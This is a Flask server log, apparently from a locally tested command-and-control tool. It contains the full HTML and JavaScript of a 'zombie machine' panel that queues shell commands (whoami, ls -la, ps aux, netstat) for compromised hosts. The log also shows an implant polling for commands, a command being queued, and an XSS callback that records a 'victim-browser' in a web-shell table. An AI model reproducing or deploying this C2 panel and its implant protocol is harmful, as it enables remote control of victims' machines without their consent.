2025-06-24 21:36:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 21:36:06 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 21:36:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0010s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> 殭屍機器上線: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</p>\n            <p><strong>建立時間:</strong> 2025-06-24 21:35:42.674482</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 21:36:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:36:06] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 21:36:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:36:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:36:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 25 bytes [200 OK]>
2025-06-24 21:36:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:36:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:36:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:36:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:36:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 25 bytes [200 OK]>
2025-06-24 21:36:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:36:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:36:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:36:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:36:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 25 bytes [200 OK]>
2025-06-24 21:36:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:36:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:36:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:36:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:36:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 25 bytes [200 OK]>
2025-06-24 21:36:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:36:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:36:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:36:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:36:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 25 bytes [200 OK]>
2025-06-24 21:36:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:36:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:36:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:36:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:36:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 25 bytes [200 OK]>
2025-06-24 21:36:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:36:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:36:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:36:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:36:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 25 bytes [200 OK]>
2025-06-24 21:36:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:36:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:36:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:36:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:36:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 25 bytes [200 OK]>
2025-06-24 21:36:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:36:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:36:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:36:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:36:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 25 bytes [200 OK]>
2025-06-24 21:36:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:36:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:36:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:36:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:36:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 25 bytes [200 OK]>
2025-06-24 21:36:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:36:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:37:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:37:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:37:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 25 bytes [200 OK]>
2025-06-24 21:37:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:37:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 21:37:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 21:37:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 21:37:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 25 bytes [200 OK]>
2025-06-24 21:37:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:37:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 22:11:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_command_to_do(zombie_ip='127.0.0.1')
2025-06-24 22:11:09 | INFO     | control_route.py:197 | add_command_to_do() | 用戶請求為殭屍機器 127.0.0.1 添加命令
2025-06-24 22:11:09 | INFO     | control_route.py:225 | add_command_to_do() | 成功為殭屍機器 127.0.0.1 添加命令: cmd
2025-06-24 22:11:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_command_to_do 執行完畢 (耗時: 0.0033s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 22:11:09 | WARNING  | file.py:272 | set() | Exception raised while handling cache file '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/77d9f2be26b47f2d7deb80c25c95dc3c'
Traceback (most recent call last):
  File "/home/hacker/Desktop/share/C2/venv/lib/python3.12/site-packages/cachelib/file.py", line 260, in set
    fd, tmp = tempfile.mkstemp(
              ^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 496, in mkstemp
    return _mkstemp_inner(dir, prefix, suffix, flags, output_type)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 395, in _mkstemp_inner
    fd = _os.open(file, flags, 0o600)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/tmppv3zckn4.__wz_cache'
2025-06-24 22:11:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 22:11:09] "[32mPOST /api/control/add_command_to_do/127.0.0.1 HTTP/1.1[0m" 302 -
2025-06-24 22:11:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 22:11:09 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 22:11:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0008s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> 殭屍機器上線: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</p>\n            <p><strong>建立時間:</strong> 2025-06-24 21:35:42.674482</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 22:11:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 22:11:09] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 22:11:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 22:11:13 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 22:11:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0004s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-24 22:11:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 22:11:13] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 23:11:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:11:42 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-24 23:11:42 | INFO     | control_route.py:41 | add_message() | 消息添加成功，目標IP: victim-browser,消息: XSS_GET_signal,時間: 2025-06-24 23:11:42.127407
2025-06-24 23:11:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0041s) -> 回傳: (<Response 216 bytes [200 OK]>, 200)
2025-06-24 23:11:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:11:42] "GET /api/control/add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1" 200 -
2025-06-24 23:11:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:11:43 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-24 23:11:43 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('victim-browser', 'XSS_GET_signal', None, '2025-06-24 23:11:43.718970', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:11:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0009s) -> 回傳: (<Response 384 bytes [200 OK]>, 500)
